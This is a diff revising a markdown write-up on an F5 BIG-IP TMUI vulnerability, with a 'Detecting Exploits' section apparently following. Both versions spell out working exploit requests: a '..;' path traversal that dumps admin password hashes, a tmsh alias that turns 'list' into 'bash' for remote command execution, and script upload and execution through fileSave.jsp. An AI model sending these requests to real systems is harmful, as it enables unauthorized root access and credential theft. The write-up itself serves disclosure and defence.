@@ -49,9 +49,9 @@ This code injection vulnerability impacts the TMUI (configuration utility for th
 ```
 https://[hostname]/tmui/login.jsp
 ```
-The exploit is a "..;", the following is an exploitable URL that will return a list of all of the admin users along with their password hashes:
+The exploit is a "..;" following the above URL. The URL below is an example of an exploitable URL that will return a list of all of the admin users along with their password hashes:
 ```
-/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin
+https://[hostname]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin
 ```
 
 > **The Three Most Common Exploits**
@@ -71,29 +71,32 @@ The exploit is a "..;", the following is an exploitable URL that will return a l
 > /tmui/locallb/workspace/fileSave.jsp
 > ```
 
-While the above execute command can only access tmsh commands, you can use "create alias" to allow the hacker to execute any bash command as the root user! "Create alias" can be used to link "list" command in tmsh to "bash". This gives full root access to the linux interface:
+While the above execute command can only access tmsh commands, you can use "create alias" to allow execution of any bash command! "Create alias" can be used to link the tmsh "list" command to the "bash" command. The following is what the command will look like:
 
 ```
 https://[hostname]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash
 ```
 
-AFter you send in the above command, any following command that you send in using "list" will actually be sending and executing a "bash" command!
+Once the alias is created, more requests can be sent in the same manner in subsequent requests containing any bash commands the user would like to execute, the word "bash" in the command must simply be replaced with "list". 
 
-Instead of continually executing one line bash commands, you can create a bash script and save it suing the command we learned above. This is what it will look like to save a bash script:
+Alternatively, instead of continually executing one line bash commands, you may want to have a whole script execute. You can save and execute a bash script on the server. First, you can save the script like so:
+
 ```
 fileSave.jsp?fileName=/tmp/cmd&content=id
 ```
-Then to execute the script (remember "list" now means "bash":
+
+Second, execute the script like so (remember "list" actually means "bash":
+
 ```
 tmshCmd.jsp?command=list+/tmp/cmd
 ```
 
-In order to delete the alias and clean up:
+Finally, in order to delete the alias and clean up:
+
 ```
 https://[hostname]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list
 ```
 
-[The typical sequence]
 
 ## Detecting Exploits 
 
